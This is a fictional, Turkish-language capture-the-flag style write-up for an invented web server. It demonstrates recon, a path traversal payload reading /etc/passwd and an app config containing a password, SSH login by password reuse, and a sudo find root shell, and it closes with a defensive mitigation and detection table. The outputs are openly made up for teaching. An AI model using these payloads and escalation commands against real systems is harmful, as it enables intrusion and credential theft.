---
title: "Paperboat (kurgusal)"
platform: other
category: web
difficulty: easy
date: 2026-01-01
tags: [path-traversal, credential-reuse, sudo, gtfobins]
tools: [nmap, gobuster, curl, ssh]
fictional: true
---

# Paperboat (kurgusal)

> **Formatı göstermek için kurgusal örnek. Gerçek bir oda değil; burada hiçbir şey çözülmedi.**
> Makine, IP'ler (192.0.2.0/24 dokümantasyon için ayrılmıştır, RFC 5737), kimlik bilgileri ve
> aşağıdaki çıktılar uydurmadır. Komutlar ve teknikler gerçektir, ama hiçbir platformda bu makine yoktur.

## Özet

Paperboat, dahili bir doküman görüntüleyici barındıran hayali bir Ubuntu web sunucusudur.
Görüntüleyici, `file` parametresindeki dosyayı yolu kısıtlamadan okuyor (path traversal, CWE-22).
Bu, uygulamanın yapılandırma dosyasını açığa çıkardı; içindeki veritabanı parolası `deploy` SSH
hesabında da kullanılıyordu. `deploy`, `sudo` ile root olarak `find` çalıştırabiliyor ve bu root
shell demek. Zincir: path traversal, dosyada kimlik bilgisi, parola tekrar kullanımı, sudo yanlış yapılandırması.

## Keşif (Reconnaissance)

Önce tüm TCP portlarını tara, sonra varsayılan scriptler ve sürüm tespitini yalnızca açık portlara uygula.

```console
$ nmap -p- --min-rate 1000 -oA nmap/allports 192.0.2.10
Nmap scan report for 192.0.2.10
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

$ nmap -sC -sV -p 22,80 -oA nmap/targeted 192.0.2.10
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Paperboat Docs
(çıktı kırpıldı: host anahtarları çıkarıldı)
```

Yalnızca SSH ve bir web sunucusu açık. Sürümler Ubuntu 22.04'ü işaret ediyor. SSH sürümü tek başına
işe yaramıyor, bu yüzden başlangıç noktası web uygulaması.

## Numaralandırma (Enumeration)

Web kökünde ne saklandığını görmek için dizin taraması:

```console
$ gobuster dir -u http://192.0.2.10 -w /usr/share/wordlists/dirb/common.txt -t 30
/index.html           (Status: 200) [Size: 612]
/static               (Status: 301) [Size: 178] [--> http://192.0.2.10/static/]
```

Fazla bir şey yok. Siteyi elle gezince ana sayfa makalelerine şöyle bağlanıyor:

```text
http://192.0.2.10/view?file=getting-started.md
```

Dosya adı alan bir parametre, path traversal denemek için klasik bir yer. Normal isteğin cevabı,
metin olarak gösterilen Markdown dosyası:

```console
$ curl -s 'http://192.0.2.10/view?file=getting-started.md' | head -n 3
# Getting started
Welcome to the Paperboat internal docs.
```

Sıradaki adım: `..` dizileri doküman klasöründen çıkabiliyor mu?

## İlk Erişim / Sömürü (Foothold / Exploitation)

Dört dizin yukarıdaki `/etc/passwd` isteniyor:

```console
$ curl -s 'http://192.0.2.10/view?file=../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
deploy:x:1001:1001::/home/deploy:/bin/bash
```

Çalışıyor: sunucu girdimizi doküman klasörüne, sonucun nereye çıktığına bakmadan ekliyor. İki not:
(1) login shell'i olan gerçek bir kullanıcı var, `deploy`; (2) web sunucusu `www-data` olarak
çalışıyor, yani yalnızca herkesçe okunabilir dosyalara erişilebilir.

Web uygulamaları sırlarını genelde kendi yapılandırmasında tutar. nginx ve `/etc/passwd`
uygulamanın `/var/www` altında olduğunu söylüyor; uygulama klasörü `docs/` klasörünün bir üstünde:

```console
$ curl -s 'http://192.0.2.10/view?file=../config.py'
DB_HOST = "127.0.0.1"
DB_USER = "paperboat"
DB_PASSWORD = "paperboat-Db-2024"
```

Parolalar tekrar kullanılır. Bunu shell'i olan tek kullanıcıda deniyoruz:

```console
$ ssh deploy@192.0.2.10
deploy@192.0.2.10's password:
deploy@paperboat:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy)
```

`deploy` olarak ilk erişim sağlandı.

## Yetki Yükseltme (Privilege Escalation)

Bir Linux makinesinde ilk iş: bu kullanıcı `sudo` ile ne çalıştırabilir?

```console
deploy@paperboat:~$ sudo -l
User deploy may run the following commands on paperboat:
    (root) NOPASSWD: /usr/bin/find
```

`find`, `-exec` ile keyfi program çalıştırabilir; yani root olarak izin vermek root shell'e izin
vermektir (GTFOBins'te "find", Sudo bölümü). `-quit`, `find`'ın ilk eşleşmeden sonra durmasını sağlar:

```console
deploy@paperboat:~$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root.

## Flag'ler

| Flag | Konum | Değer |
|------|-------|-------|
| user | `/home/deploy/user.txt` | `flag{...}` |
| root | `/root/root.txt` | `flag{...}` |

(Bilerek gizlendi. Gerçek bir writeup'ta değer asla gösterilmez.)

## Ne öğrendim

- Dosya adı alan bir parametre her zaman `../` dizileriyle denenmeli.
- Dosya okuma açığıyla uygulamanın kendi yapılandırmasını okumak, "dosya okuyabiliyorum"dan
  "geçerli kimlik bilgisi"ne giden en hızlı yollardan biri.
- `sudo -l` ilk yetki yükseltme kontrolü; komut çalıştırabilen her binary (`find`, `vim`, `awk`, ...)
  `sudo` altında tehlikelidir.

## Neyi farklı yapardım

- Yol tahmin etmek yerine `/proc/self/cwd/` ve uygulamanın kaynak dosyasını daha erken denerdim.
- Bulduğum parolayı başka açık aramadan önce hemen SSH'de denerdim.

## Savunma açısından çıkarımlar

| Zayıflık | Önleme | Tespit | ATT&CK |
|----------|--------|--------|--------|
| `file` parametresinde path traversal | Son yolu çöz (`os.path.realpath`) ve doküman klasörü dışındakileri reddet veya izin verilen isim listesinden sun | Web logları: `../` veya `%2e%2e%2f` içeren istekler | T1190 Exploit Public-Facing Application |
| Okunabilir yapılandırma dosyasında parola | Sırları ortam değişkeninden veya sır deposundan yükle; dosya izinlerini kısıtla; uygulamayı kısıtlı kullanıcı/konteynerde çalıştır | Dosya bütünlüğü izleme ve yapılandırma dosyası adlarına gelen isteklerde web-log alarmı | T1552.001 Credentials In Files |
| SSH için tekrar kullanılan parola | Her servis için ayrı kimlik bilgisi; yalnızca SSH anahtarı, `PasswordAuthentication no` | `auth.log` içinde olağandışı kaynaktan SSH girişi alarmı | T1078 Valid Accounts |
| `find` üzerinde `sudo` | En az yetki: shell çalıştırabilen binary'lere izin verme; gerekiyorsa argümanları sabitleyen bir sarmalayıcı kullan | auditd veya sudo logları (`/var/log/auth.log`): `sudo` ile `-exec`'li `find` | T1548.003 Sudo and Sudo Caching |

## Kaynaklar

- OWASP, Path Traversal: <https://owasp.org/www-community/attacks/Path_Traversal>
- CWE-22: <https://cwe.mitre.org/data/definitions/22.html>
- GTFOBins, find: <https://gtfobins.github.io/gtfobins/find/>
- RFC 5737, dokümantasyon adres blokları: <https://www.rfc-editor.org/rfc/rfc5737>
- MITRE ATT&CK: <https://attack.mitre.org/>
